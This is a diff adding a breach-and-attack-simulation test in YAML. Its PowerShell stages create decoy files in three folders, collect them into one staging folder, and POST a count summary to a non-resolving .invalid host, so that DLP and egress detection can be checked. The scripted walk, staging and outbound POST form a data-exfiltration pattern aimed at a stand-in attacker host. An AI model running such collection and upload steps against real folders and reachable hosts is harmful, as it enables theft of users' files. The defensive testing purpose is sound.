@@ -1,0 +1,164 @@
+id: collection-multidir-automated-exfil
+product_line: dlp
+name: Automated Multi-Directory Collection Probe
+description: >
+  Telemetry-safe emulation of an adversary who runs a script that walks several
+  directories, collects every file matching a set of extensions, and stages the
+  results in one place without a human step. The three source folders are
+  synthetic decoys created by this run under %TEMP%, so no real directory is
+  walked. The check is whether automated, multi-location collection is noticed
+  before any transfer happens.
+
+  KILL CHAIN STAGES:
+    1. Decoy Sources        — create three per-run source folders with synthetic files (T1005)
+    2. Automated Collection — walk the three folders and collect matching files into one staging folder (T1005)
+    3. Summary Upload       — POST a count-only summary to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: Only this run's folders under %TEMP% are created, read, and deleted. The
+  collection walker never reaches a path outside them. The destination is a .invalid
+  host and cannot resolve. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - automation
+  - multi-directory
+  - exfiltration
+  - dlp
+  - t1005
+  - t1048
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Decoy Sources (T1005)
+  # ---------------------------------------------------------------------------
+  - name: "Automated Collection 1 — Synthetic Multi-Directory Sources (T1005)"
+    technique_id: T1005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Creates three per-run folders (docs, finance, projects) under %TEMP%\\bas_auto_<runid>, each with three synthetic [BAS-SIM] files of mixed extensions. Deleted in cleanup."
+    telemetry:
+      - "Sysmon EID 11: decoy files created in three folders under %TEMP%\\bas_auto_<runid>"
+    detection:
+      - "DLP: sensitive-named files spread across several folders in one session"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $root = Join-Path $env:TEMP "bas_auto_$runId"
+      $made = 0
+      foreach ($d in @('docs','finance','projects')) {
+        $dir = Join-Path $root $d
+        New-Item -ItemType Directory -Path $dir -Force | Out-Null
+        foreach ($ext in @('txt','csv','log')) {
+          Set-Content -Path (Join-Path $dir ("synthetic_{0}.{1}" -f $d, $ext)) -Value "[BAS-SIM] synthetic $d $ext run=$runId" -Encoding UTF8
+          $made++
+        }
+      }
+      Write-Output "EXEC T1005: created $made synthetic decoy file(s) across three folders under $root. Automated Stage 1. [BAS-SIM-AUT-S1]"
+      Write-Output "FAIL: Sensitive-named decoys were created across several folders in one session with no alert."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Automated Collection (T1005)
+  # ---------------------------------------------------------------------------
+  - name: "Automated Collection 2 — Scripted Walk and Collect Across Folders (T1005)"
+    technique_id: T1005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Walks only this run's three decoy folders, copies files with txt, csv, or log extensions into one staging folder, and writes a summary count. The walk is bounded to the run's root and never leaves it."
+    telemetry:
+      - "Sysmon EID 11: copies into %TEMP%\\bas_auto_<runid>\\staged"
+      - "PowerShell EID 4104: recursive Get-ChildItem loop"
+    detection:
+      - "EDR: scripted collection from several folders into one staging path — automation IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $root = Join-Path $env:TEMP "bas_auto_$runId"
+      if (-not (Test-Path $root)) {
+        Write-Output "SKIP T1005: no decoy sources from Stage 1. [BAS-SIM-AUT-S2]"
+        exit 0
+      }
+      $staged = Join-Path $root 'staged'
+      New-Item -ItemType Directory -Path $staged -Force | Out-Null
+      $exts = @('.txt','.csv','.log')
+      $collected = 0
+      Get-ChildItem -Path $root -Recurse -File | Where-Object { $exts -contains $_.Extension.ToLower() -and $_.DirectoryName -notlike "$staged*" } | ForEach-Object {
+        Copy-Item $_.FullName -Destination (Join-Path $staged ($_.Directory.Name + '_' + $_.Name)) -Force
+        $collected++
+      }
+      Write-Output "EXEC T1005: collected $collected file(s) from three folders into $staged in one automated pass. Automated Stage 2. [BAS-SIM-AUT-S2]"
+      if ($collected -gt 0) {
+        Write-Output "FAIL: Automated collection across several folders into one staging path raised no alert. Scripted multi-location collection should be detected before transfer."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — Summary Upload (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Automated Collection 3 — Count-Only Summary Upload to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs a one-line count summary of the automated collection to an RFC-6761 .invalid host. The summary contains no file content and no file names. The host cannot resolve, so nothing leaves the host."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Proxy/egress: POST to an unknown host after a collection run"
+    detection:
+      - "Egress: outbound call to an unknown host following a bulk collection — exfil alert expected"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $staged = Join-Path $env:TEMP "bas_auto_$runId\staged"
+      if (-not (Test-Path $staged)) {
+        Write-Output "SKIP T1048.003: no collection from Stage 2 to summarise. [BAS-SIM-AUT-S3]"
+        exit 0
+      }
+      $count = @(Get-ChildItem -Path $staged -File).Count
+      $target = "http://bas-sim-auto-$runId.invalid/report"
+      $body = "[BAS-SIM] automated collection summary run=$runId collected_count=$count"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -Body $body -ContentType 'text/plain' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted a count-only summary POST to $target. reached=$reached (expected: false). Summary upload Stage 3. [BAS-SIM-AUT-S3]"
+      if ($reached) {
+        Write-Output "FAIL: An outbound report followed an automated bulk collection and reached an unknown host. Egress is not correlating collection with outbound calls."
+      } else {
+        Write-Output "FAIL: The endpoint sent an outbound report to an unknown host right after an automated bulk collection, with no alert. Unreachable only because the domain is .invalid."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_auto_*') -Recurse -Force -ErrorAction SilentlyContinue
